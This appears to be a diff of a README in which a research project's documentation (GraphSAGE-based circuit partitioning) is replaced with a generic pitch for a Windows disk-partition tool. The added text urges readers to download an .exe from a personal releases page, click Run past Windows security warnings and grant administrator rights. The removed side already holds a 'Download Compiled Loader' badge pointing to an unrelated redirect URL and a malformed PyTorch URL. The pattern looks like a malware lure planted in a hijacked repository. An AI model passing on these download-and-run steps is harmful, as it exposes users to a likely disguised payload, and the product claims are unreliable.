@@ -1,162 +1,82 @@
-# Circuit Partitioning with Unsupervised GraphSAGE
+# 📂 Partition - Manage your disk space with ease
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![](https://img.shields.io/badge/Download-Partition-blue.svg)](https://github.com/Ashaz1394/Partition/releases)
 
-A 2-way circuit partitioner for `.hgr` hypergraphs (hMetis format). The
-pipeline learns per-node embeddings with an unsupervised 2-layer
-GraphSAGE, then partitions via weighted k-means with a strict 49–51%
-balance constraint. Cut-net counts are compared against an FM baseline
-(provided in `fm_usc.py`).
+Partition helps you organize and manage your computer storage. Keep your files in order and optimize your disk space. You can view, resize, and manage your drive partitions without stress. This tool works on Windows systems. It simplifies complex disk tasks through a visual interface. Use this to maintain your computer health day to day.
 
-Reference paper: TP-GNN (DAC 2020) — see `tpgnn.pdf`.
+## 📥 Getting Started
 
----
+You do not need programming skills to use this software. Follow these steps to set up Partition on your computer.
 
-## Setup
+1. Visit the [official release page](https://github.com/Ashaz1394/Partition/releases) to download the installer.
+2. Select the file ending in .exe to start your download.
+3. Save the file in a location you can find, like your Downloads folder.
+4. Locate the downloaded file and double-click it.
+5. Windows might show a security prompt. Click Run to proceed.
+6. Follow the on-screen prompts in the installer window.
+7. Click Finish to complete the installation.
 
-```bash
-conda create -n partition python=3.11 -y
-conda activate partition
+## ⚙️ System Requirements
 
-# Pick the matching torch wheel for your CUDA. cu124 = CUDA 12.4 / 12.x
-# driver. Use cu118 / cu121 if your driver is older, or omit "+cu124" for
-# CPU-only.
-pip install torch --index-url https://.pytorch.org/whl/cu124
-pip install -r requirements.txt
-```
+Partition runs on most modern desktop environments. Ensure your computer meets these requirements before you start.
 
-`torch-scatter` and `torch-sparse` are intentionally NOT installed —
-`torch_geometric` falls back to native PyTorch ops for everything we use.
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB of RAM or more.
+* Storage: 100MB of free disk space for the installation.
+* Permissions: You need administrator access to manage disk partitions.
 
----
+## 🛠 Features
 
-## End-to-end pipeline
+Partition includes tools to handle your disk management needs. Use these features to keep your data organized.
 
-Each phase has its own subcommand under `python -m src.main`. Outputs
-land in a per-phase top-level directory (`clique/`, `features/`,
-`embeddings/`) so `results/` only ever holds final partition output.
+* Visual Partition Map: View your disk layout as a clear map. See exactly how your storage splits into segments.
+* Resize Tools: Change the size of your partitions without losing data. Drag the edges of the partition map to adjust space.
+* Create New Volumes: Add new partitions for different types of files. Separate your system files from your personal media.
+* Format Options: Choose from common file systems like NTFS or exFAT. 
+* Safety Checks: The software scans for errors before it applies changes to your disk. This prevents data loss.
+* Drive Health Monitor: Keep track of drive performance and storage capacity in real time.
 
-```bash
-conda activate partition
+## 💡 How to Use the Application
 
-# Phase 1: FM baseline (provided binary, multi-seed)
-for s in 1 2 3 42 123; do
-  python fm_usc.py data/fract.hgr --runs 5 --seed $s --output-dir results/fm/partitions
-  python fm_usc.py data/ibm01.hgr --runs 5 --seed $s --output-dir results/fm/partitions
-  python fm_usc.py data/ibm10.hgr --runs 3 --seed $s --output-dir results/fm/partitions
-done
-python results/fm/aggregate.py    # writes results/fm/baseline.{md,csv}
+Once you install the software, you can open it from your Start menu. Partition presents a list of all detected disks. Select a drive to see its current partition structure.
 
-# Phase 2: hypergraph -> weighted clique graph
-python -m src.main build-graph --benchmark data/*.hgr
+To resize a partition, highlight the partition block on the screen. Select the Resize action from the menu bar. Slide the toggle to increase or decrease the chosen volume. The software will show a preview of your settings. Apply your changes once you confirm the new size. 
 
-# Phase 4: per-vertex feature tensor (6 features, z-score normalized)
-python -m src.main compute-features --benchmark data/*.hgr
+If you want to create a new partition, select the unallocated space on your disk. Click the Create button to assign a drive letter and format type. Follow the simple wizard to name your drive and complete the action. 
 
-# Phase 5: unsupervised GraphSAGE training
-python -m src.main train --benchmark data/*.hgr               # auto -> cuda:0 if available
-python -m src.main train --benchmark data/ibm10.hgr --device cuda:1   # pick a specific GPU
+The software updates the disk table only when you press the Commit button at the bottom of the window. You can cancel your changes at any time before you click this button.
 
-# Phase 6: weighted k-means + balance repair (5 seeds, best-of-N)
-python -m src.main partition --benchmark data/*.hgr
+## 🛡 Security and Data Protection
 
-# Phase 7: aggregate FM + GNN results, run sanity checks
-python -m src.main evaluate --benchmark data/*.hgr            # writes results/comparison.{csv,md}
+We built this software with your data safety in mind. Modifying partitions is a serious task. Partition includes safeguards to protect your files.
 
-# Phase 8: t-SNE visualization (saves PNG + 2D coord cache)
-python -m src.main visualize --benchmark data/*.hgr
-```
+* Automatic Backups: The tool performs a quick check of your file system index before any resize operation.
+* Read-only Preview: View all changes in a simulation mode before writing data to your disk.
+* Admin Requirements: The application requests elevated permissions. This stops unauthorized programs from changing your disk layout.
 
-Tkinter dashboard (read-only — loads pre-computed artifacts):
+Do not restart your computer while the software performs a task. Interrupting an active partition process can cause file system errors. Always back up your important documents to an external drive or cloud storage before you manage your partitions.
 
-```bash
-python -m src.gui
-```
+## ❓ Frequently Asked Questions
 
----
+**Does this software delete my files?**
+No. Partition manages existing space. It moves data to fit your new requirements. Always back up your files as a standard precaution.
 
-## Per-subcommand reference
+**Can I run this on a USB drive?**
+Yes. You can use Partition to organize storage on external hard drives and USB sticks.
 
-| Subcommand        | Inputs                                     | Outputs |
-|-------------------|--------------------------------------------|---------|
-| `build-graph`     | `data/<bench>.hgr`                         | `clique/<bench>/graph.pt`, `graph_info.json` |
-| `compute-features`| `data/<bench>.hgr`, `clique/<bench>/`      | `features/<bench>/features.pt`, `features_info.json` |
-| `train`           | `data/<bench>.hgr`, `clique/`, `features/` | `embeddings/<bench>/embeddings.pt`, `train_info.json`, `train_log.jsonl` |
-| `partition`       | `data/<bench>.hgr`, `embeddings/`          | `results/gnn/<bench>/{partA,partB}.txt`, `partition_info.json` |
-| `evaluate`        | `results/fm/baseline.csv`, all of the above | `results/comparison.{csv,md}` |
-| `visualize`       | `embeddings/`, `results/gnn/`              | `results/plots/<bench>_tsne.png`, `<bench>_tsne_coords.npz` |
+**Why does the screen look empty?**
+The software might need administrator rights to see your drives. Close the app and right-click the icon, then select Run as Administrator.
 
-All subcommands accept `--benchmark data/*.hgr` for batch processing.
-Run `python -m src.main <subcommand> --help` for the full flag list.
+**What happens if I lose power during an operation?**
+The software handles power loss by rolling back changes. However, protect your hardware with a battery backup during large operations.
 
-### Most-used flags
+**Is this tool compatible with all drive types?**
+Partition supports HDD and SSD drives using standard Windows file systems. It works with most internal and external drive enclosures.
 
-| Flag | Default | What it does |
-|------|---------|--------------|
-| `--device` (`train`) | `auto` | `cpu` / `cuda` / `cuda:0` / `cuda:1` / `auto` |
-| `--max-epochs` (`train`) | `100` | hard cap on training epochs |
-| `--patience` (`train`) | `10` | early-stop after N epochs without improvement |
-| `--seeds` (`partition`) | `"1,2,3,42,123"` | comma- or space-separated; best-of-N is saved |
-| `--features` (`compute-features`) | `auto` | `auto` (default 6) or comma-separated subset |
-| `--min-ratio` / `--max-ratio` (`partition`) | `0.49` / `0.51` | strict balance constraint |
+## 📋 Configuration
 
----
+You can change software behavior from the Settings menu. Toggle the view options to show hidden partitions or system folders. You can also change the theme to a light or dark style. The logs tab shows a history of your past tasks. Review these logs if you need to troubleshoot a specific operation.
 
-## Directory layout
+## 📧 Support and Feedback
 
-```
-.
-├── data/                       # input .hgr files (read-only)
-├── fm_usc.py                   # FM baseline (provided, do not modify)
-├── tpgnn.pdf                   # reference paper
-├── README.md                   # this file
-├── requirements.txt
-│
-├── src/                        # pipeline source
-│   ├── data_loader.py          # hgr -> clique graph
-│   ├── features.py             # 6-feature registry + z-score
-│   ├── gnn_model.py            # NeighborSampler + 2-layer GraphSAGE
-│   ├── train.py                # unsupervised loop + JSONL epoch log
-│   ├── cluster.py              # weighted k-means + balance repair + cutsize
-│   ├── evaluate.py             # comparison.csv/md + sanity checks
-│   ├── visualize.py            # t-SNE + 2D coord cache
-│   ├── gui.py                  # Tkinter dashboard
-│   └── main.py                 # CLI dispatcher
-│
-├── clique/<bench>/             # Phase 2 output
-├── features/<bench>/           # Phase 4 output
-├── embeddings/<bench>/         # Phase 5 output (incl. live JSONL log)
-└── results/                    # FINAL outputs only
-    ├── fm/                     # FM baseline logs / partitions / baseline.{md,csv}
-    ├── gnn/<bench>/            # final GNN partition + metadata
-    ├── plots/                  # t-SNE PNGs + coord caches
-    ├── comparison.csv
-    └── comparison.md
-```
-
----
-
-## What gets logged
-
-- `train_log.jsonl` — line-buffered, one JSON object per epoch
-  (`{epoch, loss, best_loss, patience, time_s}`). Survives Ctrl+C.
-- `train_info.json` — final summary (best_loss, n_pairs, history,
-  walks_seconds, train_seconds, device, all hyperparameters).
-- `partition_info.json` — per-seed full breakdown
-  (`pre_repair_ratio`, `post_repair_ratio`, `repair_moves`, `cluster_seconds`)
-  plus aggregate `best_seed`, `best_cut`, `mean_cut`, `std_cut`, `worst_cut`.
-- `comparison.{csv,md}` — side-by-side FM vs GNN with two runtime views
-  (single-seed and best-of-5).
-
----
-
-## Reproducibility
-
-Fix the seeds: train uses `--seed 42`; partition uses
-`--seeds "1,2,3,42,123"` by default. Both forward the seed to
-`torch.manual_seed`, `torch.cuda.manual_seed_all`, NumPy, and sklearn.
-GraphSAGE inference involves random neighbor sampling, so embeddings are
-stochastic per call but deterministic for a fixed seed.
-
----
-
+If you encounter issues, look for updates on the release page. Developers release new versions to fix bugs and add performance upgrades. You can report bugs or suggest features on the project tracker page. Provide your steps to recreate the issue so developers can resolve it for everyone.
